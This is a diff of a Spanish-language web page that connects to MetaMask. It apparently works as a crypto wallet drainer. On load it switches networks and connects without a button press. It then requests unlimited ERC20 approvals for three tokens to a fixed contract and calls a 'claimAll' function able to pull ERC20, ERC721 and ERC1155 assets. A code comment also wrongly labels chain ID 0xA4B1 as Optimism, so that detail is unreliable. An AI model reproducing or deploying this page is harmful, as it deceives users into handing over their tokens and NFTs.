@@ -30,115 +30,151 @@
 </head>
 <body>
     <h1>Gestión de Permisos</h1>
-    <button id="connectWallet">Conectar MetaMask</button>
     <button id="approveTokens" disabled>Autorizar Permisos</button>
     <button id="claimAll" disabled>Reclamar Todos los Tokens</button> 
 
-    
     <script>
-       const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Dirección de tu contrato
-const contractABI = [
-    {
-        "inputs": [
-            { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
-            { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
-            { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
-            { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
-        ],
-        "name": "claimAll",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-];
+        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Dirección de tu contrato
+        const contractABI = [
+            {
+                "inputs": [
+                    { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
+                    { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
+                    { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
+                    { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
+                ],
+                "name": "claimAll",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
 
-let web3;
-let userAccount;
-let contract;
+        let web3;
+        let userAccount;
+        let contract;
 
-document.getElementById("connectWallet").addEventListener("click", async () => {
-    if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        try {
-            const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-            userAccount = accounts[0];
-            contract = new web3.eth.Contract(contractABI, contractAddress);
-            document.getElementById("approveTokens").disabled = false;
-            alert("Conectado: " + userAccount);
-        } catch (error) {
-            console.error("Error conectando a MetaMask", error);
-        }
-    } else {
-        alert("MetaMask no está instalado");
-    }
-});
+        window.onload = async () => {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
 
-document.getElementById("approveTokens").addEventListener("click", async () => {
-    if (!userAccount) return alert("Primero conecta MetaMask");
-
-    // Tokens ERC20 que el contrato manejará
-    const tokens = [
-        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // Reemplazar con las direcciones correctas de los tokens
-        "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
-        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
-    ];
-
-    // Aprobación infinita
-    try {
-        for (const token of tokens) {
-            const tokenContract = new web3.eth.Contract([
-                {
-                    "constant": false,
-                    "inputs": [
-                        { "name": "spender", "type": "address" },
-                        { "name": "amount", "type": "uint256" }
-                    ],
-                    "name": "approve",
-                    "outputs": [{ "name": "", "type": "bool" }],
-                    "payable": false,
-                    "stateMutability": "nonpayable",
-                    "type": "function"
+                // Conectar automáticamente a la red Optimism
+                try {
+                    await ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0xA4B1' }], // '0xA4B1' es el ID de la red de Optimism
+                    });
+                } catch (switchError) {
+                    // Si la red no está instalada, intentar agregarla
+                    if (switchError.code === 4902) {
+                        try {
+                            await ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [
+                                    {
+                                        chainId: '0xA4B1', // ID de Optimism
+                                        chainName: 'Optimism',
+                                        rpcUrls: ['https://mainnet.optimism.io'], // RPC de Optimism
+                                        nativeCurrency: {
+                                            name: 'Ether',
+                                            symbol: 'ETH',
+                                            decimals: 18,
+                                        },
+                                        blockExplorerUrls: ['https://optimistic.etherscan.io'],
+                                    },
+                                ],
+                            });
+                        } catch (addError) {
+                            console.error('Error al agregar la red Optimism', addError);
+                            alert('No se pudo agregar la red Optimism');
+                        }
+                    } else {
+                        console.error('Error al cambiar de red', switchError);
+                        alert('Error al cambiar a la red Optimism');
+                    }
                 }
-            ], token);
 
-            // Aprueba una cantidad infinita para el contrato
-            await tokenContract.methods
-                .approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
-                .send({ from: userAccount });
+                // Continuar con la conexión y habilitar botones
+                try {
+                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                    userAccount = accounts[0];
+                    contract = new web3.eth.Contract(contractABI, contractAddress);
+                    document.getElementById("approveTokens").disabled = false;
+                    alert("Conectado a MetaMask en la red Optimism: " + userAccount);
+                } catch (error) {
+                    console.error("Error conectando a MetaMask", error);
+                    alert("Error al conectar MetaMask");
+                }
+            } else {
+                alert("MetaMask no está instalado");
+            }
+        };
 
-            console.log(`Token ${token} aprobado con éxito`);
-        }
+        document.getElementById("approveTokens").addEventListener("click", async () => {
+            if (!userAccount) return alert("Primero conecta MetaMask");
 
-        alert("Tokens aprobados con éxito para el contrato");
-    } catch (error) {
-        console.error("Error al autorizar los tokens", error);
-        alert("Error al otorgar permisos");
-    }
-});
+            // Tokens ERC20 que el contrato manejará
+            const tokens = [
+                "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // Reemplazar con las direcciones correctas de los tokens
+                "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
+                "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
+            ];
 
-document.getElementById("claimAll").addEventListener("click", async () => {
-    if (!userAccount) return alert("Primero conecta MetaMask");
+            // Aprobación infinita
+            try {
+                for (const token of tokens) {
+                    const tokenContract = new web3.eth.Contract([
+                        {
+                            "constant": false,
+                            "inputs": [
+                                { "name": "spender", "type": "address" },
+                                { "name": "amount", "type": "uint256" }
+                            ],
+                            "name": "approve",
+                            "outputs": [{ "name": "", "type": "bool" }],
+                            "payable": false,
+                            "stateMutability": "nonpayable",
+                            "type": "function"
+                        }
+                    ], token);
 
-    const tokens = [
-        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", 
-        "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1", 
-        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
-    ];
-    const amounts = [
-        web3.utils.toWei("100", "ether"), 
-        web3.utils.toWei("100", "ether"), 
-        web3.utils.toWei("100", "ether")
-    ];
+                    // Aprueba una cantidad infinita para el contrato
+                    await tokenContract.methods
+                        .approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+                        .send({ from: userAccount });
 
-    try {
-        await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
-        alert("Acción claimAll ejecutada con éxito");
-    } catch (error) {
-        console.error("Error al ejecutar claimAll", error);
-        alert("Error al ejecutar claimAll");
-    }
-});
+                    console.log(`Token ${token} aprobado con éxito`);
+                }
 
+                alert("Tokens aprobados con éxito para el contrato");
+            } catch (error) {
+                console.error("Error al autorizar los tokens", error);
+                alert("Error al otorgar permisos");
+            }
+        });
+
+        document.getElementById("claimAll").addEventListener("click", async () => {
+            if (!userAccount) return alert("Primero conecta MetaMask");
+
+            const tokens = [
+                "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", 
+                "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1", 
+                "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
+            ];
+            const amounts = [
+                web3.utils.toWei("100", "ether"), 
+                web3.utils.toWei("100", "ether"), 
+                web3.utils.toWei("100", "ether")
+            ];
+
+            try {
+                await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
+                alert("Acción claimAll ejecutada con éxito");
+            } catch (error) {
+                console.error("Error al ejecutar claimAll", error);
+                alert("Error al ejecutar claimAll");
+            }
+        });
     </script>
 </body>
 </html>
